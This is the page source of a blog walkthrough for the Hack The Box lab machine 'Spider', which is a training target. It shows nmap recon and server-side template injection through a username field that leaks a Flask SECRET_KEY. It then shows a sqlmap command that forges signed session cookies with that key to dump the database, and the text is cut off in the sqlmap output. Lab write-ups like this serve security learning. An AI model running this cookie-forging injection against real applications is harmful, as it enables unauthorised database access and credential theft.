@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	29 May 2021IP:	10.10.10.243">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[spider]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/06/04/spider/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	29 May 2021IP:	10.10.10.243">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1988.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1989.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1990.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1991.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1992.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1993.jpg">
+<meta property="article:published_time" content="2021-06-04T13:10:06.000Z">
+<meta property="article:modified_time" content="2021-10-24T06:12:43.267Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1988.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/06/04/spider/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/06/04/spider/","path":"2021/06/04/spider/","title":"Hack-The-Box-walkthrough[spider]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[spider] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Recon"><span class="nav-number">2.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-80"><span class="nav-number">3.</span> <span class="nav-text">Port-80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-escalation"><span class="nav-number">4.</span> <span class="nav-text">Privilege escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/06/04/spider/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[spider] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[spider]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-06-04 21:10:06" itemprop="dateCreated datePublished" datetime="2021-06-04T21:10:06+08:00">2021-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-10-24 14:12:43" itemprop="dateModified" datetime="2021-10-24T14:12:43+08:00">2021-10-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	29 May 2021<br>IP:	10.10.10.243</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1988.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>using nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/spider]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.243</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>There are two ports open 22:ssh 80:http</p>
+<h3 id="Port-80"><a href="#Port-80" class="headerlink" title="Port-80"></a>Port-80</h3><p>It’s redirect to spider.htb.</p>
+<p>Let’s add spider.htb in &#x2F;etc&#x2F;hosts file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.243    spider.htb</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s go to spider.htb.</p>
+<p>I found the username chiv inside black chair template.</p>
+<p>Now let’s register ourself.</p>
+<p>Login with the password which we use in registration.</p>
+<p>Now we are login but we can’t access the admin page let’s check inside user information.</p>
+<p>My username is reflected here but i can’t change my username but we can try SSTI(Server-Side Template Injection) inside username field let’s register again with 49 username.</p>
+<p>Register with username 49</p>
+<p>Now let’s check our payload work or not inside user information page.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://spider.htb/user</span><br></pre></td></tr></table></figure>
+
+<p>It’s worked 😃 we get the output 49.</p>
+<p>It’s mean the server running Jinja2 or flask. now let’s try to get config file with .</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1989.jpg"></li>
+</ul>
+<p>Register with the username </p>
+<p>And if we check the user information page we got the config file which has SECRET_KEY</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;<span class="string">&#x27;ENV&#x27;</span>: <span class="string">&#x27;production&#x27;</span>, <span class="string">&#x27;DEBUG&#x27;</span>: False, <span class="string">&#x27;TESTING&#x27;</span>: False, <span class="string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: None, <span class="string">&#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;</span>: None, <span class="string">&#x27;SECRET_KEY&#x27;</span>: <span class="string">&#x27;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#x27;</span>, <span class="string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(31), <span class="string">&#x27;USE_X_SENDFILE&#x27;</span>: False, <span class="string">&#x27;SERVER_NAME&#x27;</span>: None, <span class="string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: False, <span class="string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: None, <span class="string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: True, <span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: False, <span class="string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: None, <span class="string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: True, <span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: None, <span class="string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: datetime.timedelta(0, 43200), <span class="string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: None, <span class="string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: False, <span class="string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: False, <span class="string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;JSON_AS_ASCII&#x27;</span>: True, <span class="string">&#x27;JSON_SORT_KEYS&#x27;</span>: True, <span class="string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: False, <span class="string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: None, <span class="string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: 4093, <span class="string">&#x27;RATELIMIT_ENABLED&#x27;</span>: True, <span class="string">&#x27;RATELIMIT_DEFAULTS_PER_METHOD&#x27;</span>: False, <span class="string">&#x27;RATELIMIT_SWALLOW_ERRORS&#x27;</span>: False, <span class="string">&#x27;RATELIMIT_HEADERS_ENABLED&#x27;</span>: False, <span class="string">&#x27;RATELIMIT_STORAGE_URL&#x27;</span>: <span class="string">&#x27;memory://&#x27;</span>, <span class="string">&#x27;RATELIMIT_STRATEGY&#x27;</span>: <span class="string">&#x27;fixed-window&#x27;</span>, <span class="string">&#x27;RATELIMIT_HEADER_RESET&#x27;</span>: <span class="string">&#x27;X-RateLimit-Reset&#x27;</span>, <span class="string">&#x27;RATELIMIT_HEADER_REMAINING&#x27;</span>: <span class="string">&#x27;X-RateLimit-Remaining&#x27;</span>, <span class="string">&#x27;RATELIMIT_HEADER_LIMIT&#x27;</span>: <span class="string">&#x27;X-RateLimit-Limit&#x27;</span>, <span class="string">&#x27;RATELIMIT_HEADER_RETRY_AFTER&#x27;</span>: <span class="string">&#x27;Retry-After&#x27;</span>, <span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>: <span class="string">&#x27;static/uploads&#x27;</span>&#125;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s try to dump the database with sqlmap with help of this SECRET_KEY.</p>
+<p>But first install the req to use that SECRET_KEY</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/spider]</span><br><span class="line">└─<span class="comment"># pip3 install flask_unsign</span></span><br><span class="line">Collecting flask_unsign</span><br><span class="line">  Downloading flask-unsign-0.1.0.tar.gz (14 kB)</span><br><span class="line">Requirement already satisfied: flask <span class="keyword">in</span> /usr/lib/python3/dist-packages (from flask_unsign) (1.1.2)</span><br><span class="line">Requirement already satisfied: itsdangerous <span class="keyword">in</span> /usr/lib/python3/dist-packages (from flask_unsign) (1.1.0)</span><br><span class="line">Requirement already satisfied: markupsafe <span class="keyword">in</span> /usr/lib/python3/dist-packages (from flask_unsign) (1.1.1)</span><br><span class="line">Requirement already satisfied: requests <span class="keyword">in</span> /usr/lib/python3/dist-packages (from flask_unsign) (2.25.1)</span><br><span class="line">Requirement already satisfied: werkzeug <span class="keyword">in</span> /usr/lib/python3/dist-packages (from flask_unsign) (1.0.1)</span><br><span class="line">Building wheels <span class="keyword">for</span> collected packages: flask-unsign</span><br><span class="line">  Building wheel <span class="keyword">for</span> flask-unsign (setup.py) ... <span class="keyword">done</span></span><br><span class="line">  Created wheel <span class="keyword">for</span> flask-unsign: filename=flask_unsign-0.1.0-py3-none-any.whl size=13473 sha256=4168d0cfaed3b2508b4cb3d43f3a3f8f0786e931388d95ba5d46e2e7fa29c6fe</span><br><span class="line">  Stored <span class="keyword">in</span> directory: /root/.cache/pip/wheels/81/5a/d6/17703dd669250a72d9985b79b419f38307ba20678f71daadeb</span><br><span class="line">Successfully built flask-unsign</span><br><span class="line">Installing collected packages: flask-unsign</span><br><span class="line">Successfully installed flask-unsign-0.1.0</span><br></pre></td></tr></table></figure>
+
+<p>Now we all set let’s run the sqlmap.</p>
+<ul>
+<li>Imp : In first question of sqlmap you need to type “Y” and after that you will type “n”</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/spider]</span><br><span class="line">└─<span class="comment"># sqlmap http://spider.htb/ --eval &quot;from flask_unsign import session as s; session = s.sign(&#123;&#x27;uuid&#x27;: session&#125;, secret=&#x27;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#x27;)&quot; --cookie=&quot;session=*&quot; --delay 1 --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                       </span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.5.4#stable&#125;                                                                                           </span></span><br><span class="line"><span class="string">|_ -| . [.]     | .&#x27;</span>| . |                                                                                                          </span><br><span class="line">|___|_  [.]_|_|_|__,|  _|                                                                                                          </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                        </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:09:40 /2021-06-04/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">custom injection marker (&#x27;</span>*<span class="string">&#x27;) found in option &#x27;</span>--headers/--user-agent/--referer/--cookie<span class="string">&#x27;. Do you want to process it? [Y/n/q] y</span></span><br><span class="line"><span class="string">[10:09:42] [WARNING] it seems that you&#x27;</span>ve provided empty parameter value(s) <span class="keyword">for</span> testing. Please, always use only valid parameter values so sqlmap could be able to run properly</span><br><span class="line">[10:09:42] [WARNING] provided value <span class="keyword">for</span> parameter <span class="string">&#x27;session&#x27;</span> is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</span><br><span class="line">[10:09:42] [INFO] testing connection to the target URL</span><br><span class="line">[10:09:44] [INFO] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">you provided a HTTP Cookie header value, <span class="keyword">while</span> target URL provides its own cookies within HTTP Set-Cookie header <span class="built_in">which</span> intersect with yours. Do you want to merge them <span class="keyword">in</span> further requests? [Y/n] n</span><br><span class="line">[10:09:47] [INFO] target URL content is stable</span><br><span class="line">[10:09:47] [INFO] testing <span class="keyword">if</span> (custom) HEADER parameter <span class="string">&#x27;Cookie #1*&#x27;</span> is dynamic</span><br><span class="line"><span class="keyword">do</span> you want to URL encode cookie values (implementation specific)? [Y/n] n</span><br><span class="line">[10:09:49] [WARNING] (custom) HEADER parameter <span class="string">&#x27;Cookie #1*&#x27;</span> does not appear to be dynamic</span><br><span class="line">[10:09:51] [WARNING] heuristic (basic) <span class="built_in">test</span> shows that (custom) HEADER parameter <span class="string">&#x27;Cookie #1*&#x27;</span> might not be injectable</span><br><span class="line">[10:09:52] [INFO] testing <span class="keyword">for</span> SQL injection on (custom) HEADER parameter <span class="string">&#x27;Cookie #1*&#x27;</span></span><br><span class="line">[10:09:52] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[10:10:06] [INFO] testing <span class="string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line">[10:10:08] [INFO] testing <span 